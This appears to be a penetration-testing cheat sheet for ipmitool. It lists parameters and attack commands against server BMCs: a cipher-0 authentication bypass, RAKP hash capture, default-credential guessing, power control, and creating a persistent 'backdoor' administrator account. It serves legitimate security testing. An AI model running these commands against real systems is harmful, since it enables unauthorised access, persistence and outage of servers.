# ipmitool

- **Category**: VoIP-ICS / IPMI
- **Risk Level**: 🟡 Medium

---

## Description

ipmitool is a command-line utility for managing and configuring devices that support the Intelligent Platform Management Interface (IPMI). It interacts with Baseboard Management Controllers (BMCs) for remote server management and monitoring.

In penetration testing, ipmitool is used to:

- Enumerate IPMI services and gather system information from discovered BMCs
- Extract password hashes via the IPMI 2.0 RAKP authentication weakness
- Exploit cipher suite 0 (authentication bypass) for unauthenticated access
- Test default credentials on BMC interfaces
- Manipulate server power states and access serial-over-LAN (SOL) consoles
- Read Field Replaceable Unit (FRU) data and sensor information

## Installation

```bash
sudo apt install ipmitool
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-I` | Interface type (`lanplus`, `lan`, `open`) |
| `-H` | Remote BMC hostname or IP address |
| `-U` | Username for authentication |
| `-P` | Password for authentication |
| `-p` | UDP port (default: 623) |
| `-C` | Cipher suite ID (0 = no auth, 3 = default) |
| `-v` | Increase verbosity (repeat for more detail) |
| `-L` | Privilege level (`CALLBACK`, `USER`, `OPERATOR`, `ADMINISTRATOR`) |

### Subcommands

| Parameter | Description |
|-----------|-------------|
| `mc info` | Display BMC device information |
| `chassis status` | Show chassis status (power, intrusion, etc.) |
| `chassis power on/off/reset/status` | Control server power state |
| `user list <channel>` | List users on the specified channel |
| `user set name <id> <name>` | Set username for a user ID |
| `user set password <id> <pass>` | Set password for a user ID |
| `lan print <channel>` | Print LAN channel configuration |
| `sol activate` | Start serial-over-LAN session |
| `sol deactivate` | Stop serial-over-LAN session |
| `fru print` | Display Field Replaceable Unit data |
| `sdr list` | List Sensor Data Repository entries |
| `sensor list` | List all sensors and readings |
| `raw <netfn> <cmd> [data]` | Send raw IPMI command |

## Common Commands

### BMC Discovery and Enumeration

```bash
# Get BMC device information
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password mc info

# Print LAN configuration
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password lan print 1

# List all users on channel 1
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password user list 1
```

### Cipher Suite 0 Authentication Bypass

```bash
# Attempt access with cipher 0 (no authentication)
ipmitool -I lanplus -H 192.168.1.100 -C 0 -U admin -P any mc info

# List users via cipher 0 bypass
ipmitool -I lanplus -H 192.168.1.100 -C 0 -U admin -P any user list 1
```

### IPMI 2.0 RAKP Hash Extraction

```bash
# Verbose connection attempt to capture RAKP hash (use with Metasploit for extraction)
ipmitool -I lanplus -H 192.168.1.100 -U admin -P fakepass -vvv mc info 2>&1 | grep -i "rakp"
```

### Default Credential Testing

```bash
# Common default credentials
ipmitool -I lanplus -H 192.168.1.100 -U ADMIN -P ADMIN mc info
ipmitool -I lanplus -H 192.168.1.100 -U admin -P admin mc info
ipmitool -I lanplus -H 192.168.1.100 -U root -P calvin mc info
```

### Power Control

```bash
# Check power status
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password chassis power status

# Power on/off/reset
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password chassis power on
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password chassis power off
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password chassis power reset
```

### Serial-over-LAN Console Access

```bash
# Activate SOL session
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password sol activate

# Deactivate SOL session
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password sol deactivate
```

### Hardware Information

```bash
# Display FRU data (hardware inventory)
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password fru print

# List sensor readings
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password sensor list

# List SDR entries
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password sdr list
```

### User Manipulation (Post-Exploitation)

```bash
# Create a new admin user
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password user set name 4 backdoor
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password user set password 4 NewPass123

# Enable the user and set ADMINISTRATOR privilege
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password user enable 4
ipmitool -I lanplus -H 192.168.1.100 -U admin -P password channel setaccess 1 4 callin=on ipmi=on link=on privilege=4
```

## Notes & Tips

1. IPMI typically runs on UDP port 623; use Nmap to scan with `nmap -sU -p 623 <target>`
2. Cipher suite 0 allows unauthenticated access on vulnerable BMCs; always test for this
3. The IPMI 2.0 RAKP authentication mechanism leaks password hashes that can be cracked offline; use Metasploit's `auxiliary/scanner/ipmi/ipmi_dumphashes` for automated extraction
4. Common default credentials: `admin/admin`, `ADMIN/ADMIN`, `root/calvin` (Dell iDRAC), `admin/password`
5. Use `-I lanplus` for IPMI 2.0 (recommended); `-I lan` for legacy IPMI 1.5
6. SOL sessions provide direct console access equivalent to a physical serial connection
7. BMC interfaces are frequently on dedicated management networks (IPMI/iLO/iDRAC/IMM); check for these during network enumeration
8. FRU data can reveal hardware model, serial numbers, and asset tags useful for inventory

---

## Official References

- [ipmitool (GitHub)](https://github.com/ipmitool/ipmitool)
- [Kali Tools - ipmitool](https://www.kali.org/tools/ipmitool/)
